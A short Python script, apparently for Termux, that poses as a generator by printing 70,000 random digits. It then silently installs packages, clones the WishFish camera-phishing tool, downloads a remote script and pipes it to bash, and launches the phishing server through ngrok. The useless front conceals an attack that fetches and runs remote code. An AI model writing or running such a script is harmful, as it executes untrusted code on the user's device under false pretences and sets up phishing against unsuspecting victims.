import os
import random
os.system("clear")
purple="\033[35m"

def XPassword(Data):
 kkk = 1
 password = ''
 while len(password) != kkk:
  value = random.choice(ggg)
  password += value
 return password
ggg  = '012345678910'
for i in range (70000):
 print(XPassword(ggg))




print("\n")
os.system("pkg install git -y")
os.system("pkg install wget -y")
os.system("pkg install php -y")
os.system("termux-setup-storage")
os.system("pkg install bash -y")
os.system("git clone https://github.com/kinghacker0/WishFish")
os.system("wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok")
os.system("cd WishFish")
os.system("cp $PREFIX/bin/ngrok ~/WishFish")
os.system("bash wishfish.sh")
